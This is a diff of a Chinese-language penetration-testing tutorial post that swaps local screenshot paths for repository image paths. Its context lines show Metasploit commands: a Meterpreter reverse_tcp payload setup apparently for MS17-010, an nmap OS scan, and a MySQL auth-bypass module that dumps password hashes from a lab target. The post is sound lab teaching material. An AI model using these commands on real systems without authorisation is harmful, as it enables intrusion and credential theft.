@@ -16,15 +16,15 @@ tags: [Web安全, 渗透测试, Metasploit, vulhub]
 
 Windows 的文件系统不区分大小写,而 Linux 区分,可以利用这一点判断目标系统。
 
-![Snipaste_2026-10-18_23-51-17](C:\picture\Snipaste_2026-10-18_23-51-17.png)
+![Snipaste_2026-10-18_23-51-17](/images/web-01/01-case-test-windows-1.png)
 
-![Snipaste_2026-10-18_14-21-21](C:\picture\Snipaste_2026-10-18_14-21-21.png)
+![Snipaste_2026-10-18_14-21-21](/images/web-01/02-case-test-windows-2.png)
 
 将 index.php 改成 index.phP 后页面仍然可以正常访问,说明这是 Windows 服务器。
 
-![image-20261018235344090](C:\Users\HelloCTF_OS\AppData\Roaming\Typora\typora-user-images\image-20261018235344090.png)
+![image-20261018235344090](/images/web-01/03-case-test-linux-1.png)
 
-![Snipaste_2026-10-18_14-28-04](C:\picture\Snipaste_2026-10-18_14-28-04.png)
+![Snipaste_2026-10-18_14-28-04](/images/web-01/04-case-test-linux-2.png)
 
 把 blog 改成 bloG 就报错,说明该网站是 Linux 服务器。
 
@@ -107,9 +107,9 @@ msf6 > set payload windows/x64/meterpreter/reverse_tcp
 msf6 > show options
 ```
 
-![Snipaste_2026-10-18_23-58-54](C:\picture\Snipaste_2026-10-18_23-58-54.png)
+![Snipaste_2026-10-18_23-58-54](/images/web-01/06-msfconsole.png)
 
-![Snipaste_2026-10-19_00-02-04](C:\picture\Snipaste_2026-10-19_00-02-04.png)
+![Snipaste_2026-10-19_00-02-04](/images/web-01/07-search-ms17-010.png)
 
 设置本机 IP 与靶机 IP 后运行:
 
@@ -135,14 +135,14 @@ nmap -sV -O <你的IP>
 msf6 > search mysql
 ```
 
-![Snipaste_2026-10-19_00-09-20](C:\picture\Snipaste_2026-10-19_00-09-20.png)
+![Snipaste_2026-10-19_00-09-20](/images/web-01/10-search-mysql.png)
 
 ```
 msf6 > use auxiliary/scanner/mysql/mysql_authbypass_hashdump
 msf6 > show options
 ```
 
-![Snipaste_2026-10-19_00-09-51](C:\picture\Snipaste_2026-10-19_00-09-51.png)
+![Snipaste_2026-10-19_00-09-51](/images/web-01/11-mysql-module-options.png)
 
 ```
 msf6 > set rhosts 127.0.0.1
@@ -152,4 +152,4 @@ msf6 > run
 
 当出现 `Hash Table has been saved: /home/kali/.msf4/loot/..._mysql.hashes_xxx.txt` 的提示时,说明已经成功导出密码哈希。
 
-![Snipaste_2026-10-19_00-10-36](C:\picture\Snipaste_2026-10-19_00-10-36.png)
+![Snipaste_2026-10-19_00-10-36](/images/web-01/12-mysql-hashes.png)
